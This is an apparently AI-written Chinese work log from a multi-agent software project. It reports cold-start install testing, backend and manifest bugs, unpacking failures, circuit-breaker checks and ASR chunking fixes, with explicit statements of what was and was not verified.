  **子进程隔离生效了** —— 后端崩溃只让那个 job failed，daemon 毫发无损。这正是 T-012 决定"probe 必须跑子进程"的那条实测结论在产品里的兑现。
- **后端安装真能装吗 / 熔断器真会熔断吗** —— **本轮未验**。`/api/backends/install` 我没跑（需要真实下载），熔断器需要连续两次失败并观察 blacklist 持久化，也没跑。**如实标未验证**。

需要 Manager 决策:
1. **`oss-scout` 的一行改动**（上面给了补丁）—— 不改的话产品路径上 `asr-model` 永远缺失，我这次的 `missing=[]` 是靠额外复制文件达成的。
2. **`vad/silero-vad` 目录条目给的是 `silero_vad.onnx`，whisper.cpp 用不了** —— 需要 `model-mgmt` 补一个 ggml 格式的 VAD 条目（whisper.cpp 官方 `download-vad-model.sh` 拉的是 `ggml-silero-v5.1.2.bin`）。
3. 建议把 `node scripts/selfcheck.mjs` 作为**每轮验收的第一条命令**（你提到要当基线）。

诚实声明:
- **`pipeline.missing=[]` 是在"模型同时存在于新旧两个位置"的条件下达成的**，产品真实安装布局下仍会缺 `asr-model`，直到 daemon 那一行改掉。我没有用这个结果冒充"已通"。
- **未验**：后端包的真实下载安装（`/api/backends/install`）、熔断器熔断行为、mac/Windows 全部路径。
- `ffmpeg`/`ffprobe` 目前解析到的是系统 `/usr/bin/`，因为媒体工具包还不由我构建；产品路径上它们也应来自安装包。
- 全程用独立端口（17693/17694/17695）+ `setsid`，未干扰其他 agent 的 daemon。

---

## [2026-08-03 03:10] T-044 DONE —— 冷启动装机验证

**结论：只通过 HTTP API，一台干净机器装不起来。selfcheck 失败数 6 → 7（唯一装成功的是 ASR 模型）。**

### 冷启动初始状态（全新空 dataDir，daemon 从零启动）
```
[daemon] ⚠️  流水线缺少工具: whisper-cli, asr-model
pipeline.missing = ['whisper-cli', 'asr-model']
tokenizer = trigram | libsimple = False | vec = False
```

### 卡在哪 —— 4 个阻塞点

**① 【最严重】后端包安装是死锁 —— 要求 2.1 在第一步就断了**
```
POST /api/backends/install {"id":"whispercpp-cpu-linux-x64"}
-> 409 CONFLICT
   pack whispercpp-cpu-linux-x64 is not applicable to this machine:
   probe did not complete: probe executable not found: /tmp/cold/bin/runtime/probe
```
本机 4 个 linux/x64 包**全部** `applicable=False`，理由都是这一条：
```
llamacpp-vulkan-linux-x64 | applicable=False | probe executable not found
llamacpp-cpu-linux-x64    | applicable=False | probe executable not found
llamacpp-rocm-linux-x64   | applicable=False | probe executable not found
whispercpp-cpu-linux-x64  | applicable=False | probe executable not found
```
根因（`apps/daemon/src/http/rest/backends.ts:42 applicability()`）：
```ts
const status = state.hardware.backends.find((b) => b.id === pack.backend);
if (!status?.available) return { applicable: false, ... };
```
`hardware.backends[].available` 来自 probe，**而 probe 可执行文件本身就装在后端包里**。
→ **鸡生蛋：装不了包 → 没有 probe → 探测不出后端可用 → 装不了包。新机器永远迈不出第一步。**

**建议修法**：**CPU 包必须豁免 probe 门禁。** ADR-003 决策 3 里 CPU 是 L1「永不失败的兜底」，它是让探测成为可能的前提，不该被探测结果反过来卡住。只有加速包（cuda/vulkan/rocm/metal）该按 probe 结果 gate。这正好对上我 T-012 的分层设计：L1 无条件可装，L2 探测后再装。

**② manifest 文件名硬编码 —— `model-mgmt` 补的东西 daemon 从不读**
```js
// apps/daemon/src/http/rest/manifests.ts:49
const MODEL_MANIFEST_FILES = ['models-whisper.json', 'models-llm.json'];
const BACKEND_MANIFEST_FILE = 'backends.json';
```
磁盘上**已经有**但**从不加载**的两个文件：
- `models-asr-support.json`（5 条：`vad/silero-vad-onnx`、**`vad/silero-vad-ggml`**、`asr/sherpa-streaming-zh-14m`、`asr/paraformer-zh-small`、`punctuation/ct-transformer-zh-en`）
- `sqlite-ext.json`（`sqlite-ext-linux-x64`，`installPath: bin/ext`）

→ 目录接口里 **0 条** ASR 支持模型、**0 条** 扩展包。VAD / Paraformer / 标点 / 中文分词器**全都装不了**。
**顺带说明**：`model-mgmt` 已按我上轮的反馈补了 **`vad/silero-vad-ggml`**（whisper.cpp 要的 ggml 格式），他那边做对了，是 daemon 没读。
**修法**：把这两个常量改成扫描 `manifestDir` 下的 `models-*.json` / `*.json`，或直接把两个文件名加进去。

**③ ASR 模型装成功了，但 daemon 仍找不到 —— 且比我上轮说的更糟**
```
POST /api/models/pull {"id":"asr/whisper-base-q5_1"}  ->  succeeded
下载 59,707,625 字节 → 校验 → 硬链到 /tmp/cold/models/by-name/asr/ggml-base-q5_1.bin  ✅
```
**下载器这一层是好的**（真下载、真校验、真硬链、断点续传的 `.partial` 也看到了）。
但 daemon 的候选列表是 `ggml-base.en.bin` / `ggml-base.bin`，**装下来的叫 `ggml-base-q5_1.bin`，根本不在列表里**。
→ 即使把上轮那个「查 `by-name/asr`」的补丁打上，**写死的文件名列表仍然会漏**。正确做法是列目录取任一 `ggml-*.bin`，或从 `model_installs` 记录里取路径。

**④ 没有扩展安装端点**
`/api/extensions` 404、`/api/extensions/install` 404。即使 ②修好让 `sqlite-ext.json` 进了目录，
它的 `installPath: bin/ext` 也不是 backend store 的布局（backend 走 `by-name/backend/`），
`/api/backends/install` 装不到 `bin/ext` 去。**需要一条扩展安装路径**。

### 装成功的（API 全程，没手工 copy、没设 env）
| 步骤 | 结果 |
|---|---|
| 后端包 | ❌ 409 死锁 |
| **ASR 模型** | ✅ **59.7 MB 真下载 + 校验 + 硬链，job succeeded** |
| 中文分词器 / 向量扩展 | ❌ 无目录条目、无端点 |

### 顺带验掉的未验证项：熔断器 ✅ 真会熔断
```
阈值 = 2
第1次失败 -> blacklisted: false | consecutive: 1
第2次失败 -> blacklisted: true  | consecutive: 2      ✅
驱动升级后(560.94→570.00) -> blacklisted: false        ✅ 新证据重新给机会
探测成功后 -> blacklisted: false | consecutive: 0      ✅ 复位
```
这是我 T-012 标注「未验证」的两项之一，现在验掉了。另一项「后端安装真能装吗」——**答案是不能，见 ①**。

### 最终 selfcheck（冷启动 + API 装完能装的）
```
通过 7 · 警告 8 · 失败 7 · EXIT=1
✘ whisper-cli 未找到          ✘ libsimple 缺失
✘ 中文双字词可搜索 未测试        ✘ 中文自动选择 无可用引擎
✘ 英文自动选择 无可用引擎        ✘ db.tokenizer trigram
✘ pipeline.missing ["whisper-cli","asr-model"]
```
（失败数从 6 涨到 7 是因为接了 daemon 探针后多了 2 项检查；模型那一项由红转绿。）

需要 Manager 决策（按阻塞程度排序）:
1. **CPU 后端包豁免 probe 门禁**（`backends.ts:42`）—— 不改则新用户永远装不上任何后端包，要求 2.1 无法成立。归 `oss-scout`。
2. **manifest 文件名改为扫描目录**（`manifests.ts:49`）—— 不改则 `model-mgmt` 已经补好的 5 条 ASR 支持模型 + 扩展包永远不可见。归 `oss-scout`。
3. **ASR 模型路径解析改为列目录**（不能写死文件名）—— 我上轮给的补丁不够，这轮发现写死列表本身就是错的。归 `oss-scout`。
4. **扩展安装路径**（`bin/ext`）需要一条端点或复用 backend install 并支持自定义 installPath。归 `oss-scout` + `model-mgmt`。
5. **`ffmpeg`/`ffprobe` 仍来自系统 `/usr/bin/`** —— 已按要求记入冷启动清单，本轮未解决（需要我构建 media 工具包）。

诚实声明:
- 全程**只用 HTTP API**，没有手工 copy 文件、没有设 env 指路 —— 这正是新用户的处境。
- **我没有为了让数字好看去绕过阻塞**：后端包装不上就是装不上，selfcheck 仍然 EXIT=1。
- 下载器（`packages/downloader`）这一层实测是**好的**：真下载、真校验、真硬链、`.partial` 续传文件也确实生成了。问题全在「目录里有没有这条」和「装完谁去找它」。
- 熔断器是用 `packages/runtime` 的真实导出函数测的，非模拟。
- 用独立端口 17701 + `setsid`，未干扰其他 agent。

---

## [2026-08-03 05:30] T-048 DONE

交付:
- `packages/runtime/src/backends/applicability.ts`（新建）—— L1/L2 适用性策略（ADR-014 决策 2）
- `packages/runtime/src/selfcheck.ts`（新建）—— 自检核心库，供 daemon 开 HTTP 端点
- `packages/pipeline/src/asr/{types,paraformer}.ts` + `transcribe.ts` —— `preferredChunkMs`
- `apps/daemon/src/http/rest/backends.ts` —— **3 行调用点（见下方归属声明）**
- **109/109 测试全绿**，tsc / eslint 干净

## 1. L1 能装上了吗 —— **门禁解开了，但装的过程坏了**

**门禁：解开了 ✅**
```
冷机（全新空 dataDir）上各包的 applicable：
  whispercpp-cpu-linux-x64  | applicable=True    ← 原来是 False（死锁）
  llamacpp-cpu-linux-x64    | applicable=True    ← 原来是 False
  sqlite-ext-linux-x64      | applicable=True
  llamacpp-vulkan-linux-x64 | applicable=False | 尚未探测到硬件能力；请先安装 CPU 基础包，安装后会自动重新探测
  llamacpp-rocm-linux-x64   | applicable=False | 同上
```
L2 的拒绝理由现在是**可操作的引导**而不是一句 probe 报错。`POST /api/backends/install` 从 409 变成 202 排队。

**但安装本身坏了 ❌ —— 新发现的阻塞点：解包不完整**
```
tarball 里的文件数: 43
实际解压出来的:      3        ← libggml-cpu-sapphirerapids.so / libwhisper.so.1.9.1 / whisper-quantize
缺失: ✘ whisper-cli  ✘ whisper-server  ✘ libggml-base.so.0.15.1  ✘ libggml-cpu-zen4.so
```
下载本身是对的（9,379,235 字节全部下完，**我另外重新下载上游核对过 sha256 与 manifest 完全一致**：
`f3bf3b4369a99b54665b0f19b88483b30de27f25963b0414235dea03198515c5`）。job 报的是 `state=failed, step=verifying`，
而目录里留下 3 个文件 —— 看起来是解包中途失败/被截断，残留物没清理，重试又被去重跳过。
→ **归 `model-mgmt`（`packages/downloader/src/unpack.ts`）。** 我把摘要核对做完了，可以排除"文件损坏"这条。

**另一个 T-044 阻塞点已被 `oss-scout` 修好**：`modelPath` 现在能解析到
`/tmp/cold2/models/by-name/asr/ggml-base-q5_1.bin`（我上轮说"写死文件名列表本身就是错的"，他改了），
`asr-model` 已从 `pipeline.missing` 消失。

## 2. 冷启动 selfcheck 失败数：**7 → 7**（但内容变了）
```
通过 8 · 警告 7 · 失败 7 · EXIT=1
✘ whisper-cli 未找到            ← 解包不完整（新阻塞点）
✘ libsimple 缺失 / 中文双字词未测试 / db.tokenizer trigram   ← sqlite-ext 装不上（同一个解包问题）
✘ 中文自动选择 / 英文自动选择 无可用引擎                      ← 上面的连锁
✘ pipeline.missing ["whisper-cli"]                        ← 从 2 项减到 1 项
```
**通过数 7→8、`pipeline.missing` 从 `["whisper-cli","asr-model"]` 减到 `["whisper-cli"]`。**
失败总数没降是因为**卡点从"装不了"变成了"装了但解包只出 3/43 个文件"** —— 前一个是我修的，后一个是新查出来的。

## 3. 归属声明（Manager 要求对齐）
`applicability()` 的**策略**放在 `packages/runtime`（我的），**调用点** `apps/daemon/src/http/rest/backends.ts` 只有 3 行。
我查 `git status` 确认 `oss-scout` 当时在改 `manifests.ts`、**没动 `backends.ts`**，为不阻塞验证**我把这 3 行也改了**。
`oss-scout` 如有异议请在 inbox 提 `DISPUTE:`，我立刻退出该文件。策略函数本身是纯函数、可单测、只有一处判定。

规则实现：**L1（`cpu`，以及 macOS 上的 `metal`）无条件 `applicable=true`；L2 维持 probe gate。**
Metal 单列的理由写在代码注释里：Mac 自 10.13 起人人有 Metal、无驱动可装、shader 已用
`GGML_METAL_EMBED_LIBRARY` 编进二进制（零额外体积），拿一个还没跑过的 probe 去 gate 它，
会在 macOS 上复现同一个死锁。

## 4. Paraformer 30s 只出 1 段 —— 已修 ✅
根因：离线 Paraformer **一次调用只返回一整块文本**，所以 chunk 长度就是时间轴分辨率。默认 30s chunk → 30s 一段。
修法：`AsrCapabilities` 新增可选 `preferredChunkMs`，Paraformer 声明 **8000ms**，`TranscribePipeline` 按引擎能力规划 chunk（不再用固定常量）。
```
修复前: 337s 音频 -> 13 chunks / 13 segments（前 30 秒只有 1 段）
修复后: 337s 音频 -> 47 chunks / 47 segments，前 30 秒 4 段：
  [1.2-8.8s]   Twitter来自维基百科自由的百科全书网址，z h。
  [8.7-15.7s]  dowiwikpedia not ork Twitter非官方中文名称推特。
  [16.0-24.3s] 是一个社交网络及微博客服务，用户可以经由SMS即时通讯电邮。
  [24.3-31.9s] Twitter网站或Twitter用户端软件，如Twitter rific输入最多一百四十字的文字更新。
时间戳单调: true
```
代价可忽略：84x 实时下，30s 窗口切成 4 个 8s 窗口的算力几乎不变（都是约 0.36s）。
**这直接救回了 F5 中文的时间轴** —— ADR-013 已把中文降级成段级高亮，再只有一段就等于没有时间轴。
⚠️ `AsrCapabilities` 不在 D-06 §15 的冻结清单内（冻结的是 `AsrStream` 与合并契约），且新增的是**可选**字段，向后兼容。

## 5. selfcheck HTTP 端点 —— 核心已抽成库 ✅
`packages/runtime/src/selfcheck.ts` 导出 `runSelfCheck(input)`，返回结构化 `SelfCheckReport`
（每项含 `id` / `status` / `detail` / `required` / **`remediation`**）。
依赖用 `SelfCheckProbes` 注入，**刻意不让 `packages/runtime` import `packages/pipeline`**（会成环，pipeline 已依赖 runtime）。
→ **daemon 加 `GET /api/selfcheck` 只需组装 probes 并调用**，诊断页即可从"组件是否加载"升级到"功能是否可用"。
`architect` 自己标注过"绿灯不等于功能可用"，这就是补上那一层。**一份实现两个出口**，CLI 与端点不会各说各话。

需要 Manager 决策:
1. **解包只出 3/43 个文件** —— 当前 L1 装机的唯一阻塞。归 `model-mgmt`（`unpack.ts`）。我已排除文件损坏（摘要核对一致）。
2. **失败的安装应清理残留并允许重试** —— 现在残留目录会让重试被去重跳过，用户会卡死在"装过但用不了"。
3. `GET /api/selfcheck` 端点接线归 `oss-scout`（库已就绪）。
4. `backends.ts` 那 3 行的归属请确认（见 §3）。

诚实声明:
- **L1 门禁我修好了并实测生效；L1 实际装机仍然失败**，卡在解包。我没有把"能排队了"说成"能装上了"。
- 冷启动 selfcheck **仍然 EXIT=1**，失败数 7 未降。
- 本轮测试期间 daemon 又被别的 agent 的 `pkill` 误杀一次（端口 17705），已换 17709 重跑；被杀不影响上述结论。
- `ffmpeg`/`ffprobe` 仍来自系统 `/usr/bin/`，按要求保持记录、本轮未解决。
